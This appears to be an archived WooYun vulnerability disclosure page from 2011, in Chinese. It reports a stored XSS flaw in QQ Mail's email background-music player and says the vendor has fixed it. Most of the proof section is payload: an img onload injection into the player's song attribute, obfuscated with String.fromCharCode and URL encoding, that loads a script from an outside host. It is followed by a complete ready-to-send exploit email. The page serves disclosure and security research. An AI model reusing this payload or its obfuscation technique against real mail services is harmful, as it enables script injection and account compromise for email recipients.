@@ -1,0 +1,247 @@
+﻿<!doctype html>
+                        <html lang="en">
+                        <head>
+	                        <meta charset="UTF-8">
+	                        <title>		QQ邮箱XSS，音乐功能导致邮件加载任意javascript  </title>
+	                        <link href="../css/css.css" rel="stylesheet" /> 
+                        </head>
+                        <body> 
+                        <ul><li>标题：		QQ邮箱XSS，音乐功能导致邮件加载任意javascript  </li><li>作者：		<a href="http://www.wooyun.org/whitehats/gainover">gainover</a> 
+</li><li>提交时间：		2011-11-15 22:02</li></ul>
+                        <div class="con">
+                        <h2>漏洞详情</h2>
+		<h3 class="detailTitle">披露状态：</h3>
+		<p class="detail" style="padding-bottom:0">
+					</p>
+		<p class="detail">
+									2011-11-15：	细节已通知厂商并且等待厂商处理中<br/>
+									2011-11-16：	厂商已经主动忽略漏洞，细节向公众公开<br/>
+					</p>
+		<h3 class="detailTitle">简要描述：</h3>
+
+		<p class="detail">又是一个之前反馈的漏洞，也提交到乌云上来。 <br />
+<br />
+此漏洞在原理上和我提交的QQ微博的XSS（http://www.wooyun.org/bugs/wooyun-2011-02490）是类似的。 所以个人觉得，这一类很容易被开发人员所忽略，在其它产品类似的功能上，很有可能也存在此类漏洞。<br />
+</p>
+
+				
+						<h3 class="detailTitle">详细说明：</h3>
+		
+			<p class="detail">QQ邮箱，邮件里的音乐功能缺陷，导致邮件中可以调用任意外部JS文件。各主流浏览器均有效。 </p>
+				
+									<h3 class="detailTitle">漏洞证明：</h3>
+
+			<p class="detail">1. 使用邮件的音乐功能<br />
+<br />
+<br />
+<br />
+</p><p class="detail"><a href="../images/15215954d70f334d7e35253b59d8ae8ea2751efe.jpg" target="_blank"><img src="../images/15215954d70f334d7e35253b59d8ae8ea2751efe.jpg" alt="" width="600"/></a></p><p class="detail"><br />
+<br />
+<br />
+<br />
+2. 抓包，查看发送的邮件内容，可以得到以下内容，为播放器部分<br />
+<br />
+<br />
+<br />
+&lt;player id=&quot;cmd:bgmusic&quot; url=&quot;http://60.28.234.38/kuangren/quanbuqiang/wodeyinyue/up/2b6a0a74/002057/2813145544.wma&quot; song=&quot;%E5%AE%8C%E7%BE%8E%E8%8B%B1%E9%9B%84(%E8%AF%95%E5%90%AC)&quot; singer=&quot;%E9%98%BF%E6%9D%9C&quot;&gt;<br />
+<br />
+&lt;/player&gt; &lt;div id=QQMailBgMusicInfo style=&quot;font:12px;color:#909090;&quot;&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;你的朋友 GAINOVER 为这封邮件插入了背景音乐 - &lt;b&gt;完美英雄(试听)&lt;/b&gt;(阿杜)&lt;a href=&quot;http://music.soso.com/music.cgi?w=完美英雄(试听)&amp;pl=阿杜&quot; target=&quot;_blank&quot;&gt;查看&lt;/a&gt;&amp;nbsp;&amp;nbsp;&lt;a id=&quot;_bgmusic_play_btn_&quot; href=&quot;http://mail.qq.com/zh_CN/htmledition/playmusic.html?song=%E5%AE%8C%E7%BE%8E%E8%8B%B1%E9%9B%84(%E8%AF%95%E5%90%AC)&amp;singer=%E9%98%BF%E6%9D%9C&amp;sender=GAINOVER&amp;url=http%3A%2F%2F60.28.234.38%2Fkuangren%2Fquanbuqiang%2Fwodeyinyue%2Fup%2F2b6a0a74%2F002057%2F2813145544.wma&quot; target=&quot;_blank&quot;&gt;播放&lt;/a&gt;&lt;/div&gt;<br />
+<br />
+<br />
+<br />
+3.  邮件在播放音乐时，会读取 player 元素 的 song 和 singer 属性，并执行类似 somediv.innerHTML=song+singer的操作.<br />
+<br />
+<br />
+<br />
+4.  如果我在song里添加类似 &lt;img src=&quot;some.gif&quot; onload=&quot;alert(&#039;hehe&#039;);&quot; /&gt; <br />
+<br />
+<br />
+<br />
+将会导致执行 somediv.innerHTML=&quot;&lt;img src=\&quot;some.gif\&quot; onload=\&quot;alert(&#039;hehe&#039;);\&quot; /&gt; &quot; <br />
+<br />
+<br />
+<br />
+当innerHTML里的 img 加载时，就会自动执行 onload 里面的代码！<br />
+<br />
+<br />
+<br />
+5. 为了防止引号导致的问题，在使用JS代码时，可以直接采用 String.fromCharCode 来避开引号！<br />
+<br />
+<br />
+<br />
+构造的代码如下：<br />
+<br />
+<br />
+<br />
+&lt;img src=&#039;http://www.baidu.com/img/baidu_logo.gif&#039; onload=&#039;var s=document.createElement(String.fromCharCode(115,99,114,105,112,116));s.type=String.fromCharCode(116,101,120,116,47,106,97,118,97,115,99,114,105,112,116);s.src=String.fromCharCode(104,116,116,112,58,47,47,119,119,119,46,116,111,111,108,109,97,111,46,99,111,109,47,116,111,111,108,47,113,113,109,97,105,108,46,106,115);document.body.appendChild(s);&#039;/&gt;<br />
+<br />
+<br />
+<br />
+上面的代码，调用了我网站的JS文件, http://www.toolmao.com/tool/qqmail.js<br />
+<br />
+<br />
+<br />
+6. 对上面的代码进行 encodeURIComponent 编码， 可以得到<br />
+<br />
+<br />
+<br />
+%3Cimg%20src%3D&#039;http%3A%2F%2Fwww.baidu.com%2Fimg%2Fbaidu_logo.gif&#039;%20onload%3D&#039;var%20s%3Ddocument.createElement(String.fromCharCode(115%2C99%2C114%2C105%2C112%2C116))%3Bs.type%3DString.fromCharCode(116%2C101%2C120%2C116%2C47%2C106%2C97%2C118%2C97%2C115%2C99%2C114%2C105%2C112%2C116)%3Bs.src%3DString.fromCharCode(104%2C116%2C116%2C112%2C58%2C47%2C47%2C119%2C119%2C119%2C46%2C116%2C111%2C111%2C108%2C109%2C97%2C111%2C46%2C99%2C111%2C109%2C47%2C116%2C111%2C111%2C108%2C47%2C113%2C113%2C109%2C97%2C105%2C108%2C46%2C106%2C115)%3Bdocument.body.appendChild(s)%3B&#039;%2F%3E<br />
+<br />
+<br />
+<br />
+7. 将上面这段代码，插入到 player 的 song 属性后面，即得到<br />
+<br />
+<br />
+<br />
+&lt;player id=&quot;cmd:bgmusic&quot; url=&quot;http://60.28.234.38/kuangren/quanbuqiang/wodeyinyue/up/2b6a0a74/002057/2813145544.wma&quot; song=&quot;%E5%AE%8C%E7%BE%8E%E8%8B%B1%E9%9B%84(%E8%AF%95%E5%90%AC)%3Cimg%20src%3D&#039;http%3A%2F%2Fwww.baidu.com%2Fimg%2Fbaidu_logo.gif&#039;%20onload%3D&#039;var%20s%3Ddocument.createElement(String.fromCharCode(115%2C99%2C114%2C105%2C112%2C116))%3Bs.type%3DString.fromCharCode(116%2C101%2C120%2C116%2C47%2C106%2C97%2C118%2C97%2C115%2C99%2C114%2C105%2C112%2C116)%3Bs.src%3DString.fromCharCode(104%2C116%2C116%2C112%2C58%2C47%2C47%2C119%2C119%2C119%2C46%2C116%2C111%2C111%2C108%2C109%2C97%2C111%2C46%2C99%2C111%2C109%2C47%2C116%2C111%2C111%2C108%2C47%2C113%2C113%2C109%2C97%2C105%2C108%2C46%2C106%2C115)%3Bdocument.body.appendChild(s)%3B&#039;%2F%3E&quot; singer=&quot;%E9%98%BF%E6%9D%9C&quot;&gt;<br />
+<br />
+&lt;/player&gt; <br />
+<br />
+<br />
+<br />
+8. 以下是漏洞利用代码！直接当作邮件的HTML发送即可！<br />
+<br />
+<br />
+<br />
+&lt;player id=&quot;cmd:bgmusic&quot; url=&quot;http://60.28.234.38/kuangren/quanbuqiang/wodeyinyue/up/2b6a0a74/002057/2813145544.wma&quot; song=&quot;%E5%AE%8C%E7%BE%8E%E8%8B%B1%E9%9B%84(%E8%AF%95%E5%90%AC)%3Cimg%20src%3D&#039;http%3A%2F%2Fwww.baidu.com%2Fimg%2Fbaidu_logo.gif&#039;%20onload%3D&#039;var%20s%3Ddocument.createElement(String.fromCharCode(115%2C99%2C114%2C105%2C112%2C116))%3Bs.type%3DString.fromCharCode(116%2C101%2C120%2C116%2C47%2C106%2C97%2C118%2C97%2C115%2C99%2C114%2C105%2C112%2C116)%3Bs.src%3DString.fromCharCode(104%2C116%2C116%2C112%2C58%2C47%2C47%2C119%2C119%2C119%2C46%2C116%2C111%2C111%2C108%2C109%2C97%2C111%2C46%2C99%2C111%2C109%2C47%2C116%2C111%2C111%2C108%2C47%2C113%2C113%2C109%2C97%2C105%2C108%2C46%2C106%2C115)%3Bdocument.body.appendChild(s)%3B&#039;%2F%3E&quot; singer=&quot;%E9%98%BF%E6%9D%9C&quot;&gt;<br />
+<br />
+&lt;/player&gt; &lt;div id=QQMailBgMusicInfo style=&quot;font:12px;color:#909090;&quot;&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;你的朋友 GAINOVER 为这封邮件插入了背景音乐 - &lt;b&gt;完美英雄(试听)&lt;/b&gt;(阿杜)&lt;a href=&quot;http://music.soso.com/music.cgi?w=完美英雄(试听)&amp;pl=阿杜&quot; target=&quot;_blank&quot;&gt;查看&lt;/a&gt;&amp;nbsp;&amp;nbsp;&lt;a id=&quot;_bgmusic_play_btn_&quot; href=&quot;http://mail.qq.com/zh_CN/htmledition/playmusic.html?song=%E5%AE%8C%E7%BE%8E%E8%8B%B1%E9%9B%84(%E8%AF%95%E5%90%AC)&amp;singer=%E9%98%BF%E6%9D%9C&amp;sender=GAINOVER&amp;url=http%3A%2F%2F60.28.234.38%2Fkuangren%2Fquanbuqiang%2Fwodeyinyue%2Fup%2F2b6a0a74%2F002057%2F2813145544.wma&quot; target=&quot;_blank&quot;&gt;播放&lt;/a&gt;&lt;/div&gt;<br />
+<br />
+<br />
+<br />
+9. 最后效果如下：以下是google chrome 浏览器下的截图！<br />
+<br />
+<br />
+<br />
+<br />
+<br />
+</p><p class="detail"><a href="../images/1522011711ead6c0c5ebab5492337a77a8373857.jpg" target="_blank"><img src="../images/1522011711ead6c0c5ebab5492337a77a8373857.jpg" alt="" width="600"/></a></p><p class="detail"> </p>
+
+									<h3 class="detailTitle">修复方案：</h3>
+			<p class="detail">由于是之前提交的，厂商已修复。 </p>
+										<h3 class="detailTitle">版权声明：转载请注明来源 <a style="font-weight:normal" href="http://www.wooyun.org/whitehats/gainover" title="gainover">gainover</a>@<a style="font-weight:normal" href="http://www.wooyun.org/bugs/wooyun-2010-03317" title="QQ邮箱XSS，音乐功能导致邮件加载任意javascript">乌云</a></h3>
+		<hr align="center"/>
+
+				
+			<h2>漏洞回应</h2>
+			
+			
+															<h3 class="detailTitle">厂商回应：</h3>
+						<p class="detail">危害等级：无影响厂商忽略</p>
+													<p class="detail">忽略时间：2011-11-16 14:38</p>
+												<h3 class="detailTitle">厂商回复：</h3>				
+						<p class="detail">非常感谢gainover报告的漏洞，目前已经修复</p>
+													<p class="detail">漏洞Rank：10 (WooYun评价)</p>
+											
+
+					
+					
+					<h3 class="detailTitle">最新状态：</h3>
+
+											<p class="detail">暂无</p>
+					
+
+							
+					
+		
+<hr align="center" />
+<script type="text/javascript">
+var bugid="3317";
+var bugRating="-3";
+var myRating="";
+var ratingCount="0";
+
+
+
+function ShowBugRating(k){
+	var ratingItems=$(".myrating span");
+	$.each(ratingItems,function(i,n){
+		var nk=parseInt($(n).attr("rel"));
+		if(nk<=k){
+			$(n).addClass("on");
+		}else{
+			$(n).removeClass("on");
+		}
+	});
+	$(".myrating span").hover(
+		function(){
+			$("#ratingShow").html($(this).attr("data-title"));
+		},
+		function(){
+			$("#ratingShow").html("");
+		}
+	);
+}
+$(document).ready(function(){
+	if(myRating==""){
+		var ratingItems=$(".myrating span");
+		$(".myrating span").hover(
+			function(){
+				$(this).addClass("hover");
+				var k=parseInt($(this).attr("rel"));
+				$.each(ratingItems,function(i,n){
+					var nk=parseInt($(n).attr("rel"));
+					if(nk<k) $(n).addClass("on");
+					if(nk>k) $(n).removeClass("on");
+				});
+				$("#ratingShow").html($(this).attr("data-title"));
+			},
+			function(){
+				$(this).removeClass("hover");
+				if($("#myRating").val()==""){
+					$.each(ratingItems,function(i,n){
+						$(n).removeClass("on");
+					});
+				}
+				$("#ratingShow").html("");
+			}
+		);
+
+		$(".myrating span").click(function(){
+			var rating=$(this).attr("rel");
+			var k=parseInt($(this).attr("rel"));
+			$.post("/ajaxdo.php?module=bugrating",{"id":bugid,"rating":rating,"token":$("#token").val()},function(re){
+				//消除操作绑定
+				$(".myrating span").unbind();
+				re=parseInt(re);
+				switch(re){
+					case 1:
+						$("#ratingShow").html("评分成功");
+						$("#ratingSpan").html(parseInt($("#ratingSpan").html())+1);
+						$.each(ratingItems,function(i,n){
+							var nk=parseInt($(n).attr("rel"));
+							if(nk<=k){
+								$(n).addClass("on");
+							}else{
+								$(n).removeClass("on");
+							}
+						});
+						ShowBugRating(rating);
+						break;
+					case 2:
+						$("#ratingShow").html("请先登录");
+						break;
+					case 4:
+						$("#ratingShow").html("已对此漏洞进行过评分");
+						break;
+					case 6:
+						$("#ratingShow").html("不能对自己发布的漏洞进行评分");
+						break;
+					default:break;
+				}
+			});
+		});
+	}else{
+		if(ratingCount>2){
+			ShowBugRating(bugRating);
+		}else{
+			ShowBugRating(-3);
+		}
+	}
+});
+
+</script>
+<h3 class="detailTitle">漏洞评价：</h3>
+                        </div>
+                        </body>
+                        </html>
